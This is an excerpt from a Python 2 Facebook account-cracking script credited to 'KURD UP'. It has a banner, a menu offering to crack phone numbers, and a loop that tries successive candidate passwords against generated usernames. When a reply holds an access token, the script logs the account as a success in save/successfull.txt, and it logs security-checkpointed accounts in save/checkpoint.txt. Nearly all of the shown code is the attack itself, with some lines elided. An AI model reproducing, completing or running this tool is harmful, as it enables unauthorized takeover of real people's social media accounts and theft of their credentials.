...
\__|      \__|  \__|\________|\________|
 ...
 -----------------------------------------------------                                       
\033[1;94mAuthor: KURD UP
\033[1;94m  HAMA QUNRASH
\033[1;92m KURDISTAN
\033[1;92mNote :LAWA UP          
    """
back = 0
successful = []
cpb = []
...
def menu():
    ...
    print logo
    print 42 * '\x1b[1;91m='
    print '\x1b[1;94m[1]\x1b[1;92m KURDISTAN CRACK NUMBERS '
    print 42 * '\x1b[1;91m='
    action()
...
def action():
    ...
    time.sleep(0.1)
    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;94m Chaware ka nerakar ')
    time.sleep(0.1)
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[VERY XOSH]\x1b[1;92m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[VERY XOSH]\x1b[1;92m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[VERY XOSH]\x1b[1;92m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[VERY XOSH]\x1b[1;92m ' + k + c + user + ' >>> ' + pass5 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass5 + '\n')
                okb.close()
                oks.append(c + user + pass5)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[checkpoint]\x1b[1;91m ' + k + c + user + ' >>> ' + pass5 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[VERY XOSH]\x1b[1;92m ' + k + c + user + ' >>> ' + pass6 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass6 + '\n')
                okb.close()
                oks.append(c + user + pass6)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[checkpoint]\x1b[1;91m ' + k + c + user + ' >>> ' + pass6 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[VERY XOSH]\x1b[1;92m ' + k + c + user + ' >>> ' + pass7 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass7 + '\n')
                okb.close()
                oks.append(c + user + pass7)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[checkpoint]\x1b[1;91m ' + k + c + user + ' >>> ' + pass7 + '\n'
                cps = open('save/checkpoint.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[VERY XOSH]\x1b[1;92m ' + k + c + user + ' >>> ' + pass8 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass8 + '\n')
                okb.close()
                oks.append(c + user + pass8)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[checkpoint]\x1b[1;91m ' + k + c + user + ' >>> ' + pass8 + '\n'
                cps = open('save/checkpoint.txt', 'a')
